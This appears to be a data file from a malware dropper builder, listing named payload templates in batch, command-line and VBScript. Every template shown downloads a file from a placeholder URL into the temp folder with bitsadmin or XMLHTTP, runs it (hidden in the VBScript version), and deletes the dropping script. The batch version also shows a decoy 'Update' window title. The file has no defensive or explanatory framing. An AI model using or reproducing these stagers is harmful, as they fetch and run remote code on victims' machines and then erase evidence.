data.name: batch_payload
data.value: @echo off title Update... color f set pOut="%temp%\\{0}" bitsadmin /transfer "mdj" /download /priority FOREGROUND "{1}" %pOut% start "" %pOut% DEL "%~f0"

data.name: exe_payload
js_payload
lnk_payload
data.value: /c @echo off && title Update && bitsadmin /transfer mdj /download /priority FOREGROUND {0} "%temp%\\{1}" && start "" "%temp%\\{2}"

data.name: vbs_payload
data.value: dim pOut, xHttp, bStrm pOut = WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\\{0}" Set xHttp = CreateObject("Microsoft.XMLHTTP") Set bStrm = CreateObject("Adodb.Stream") xHttp.Open "GET", "{1}", False xHttp.Send with bStrm .type = 1 .open .write xHttp.responseBody .savetofile pOut, 2 end with CreateObject("Wscript.Shell").Run """" & pOut & """", 0, False CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName
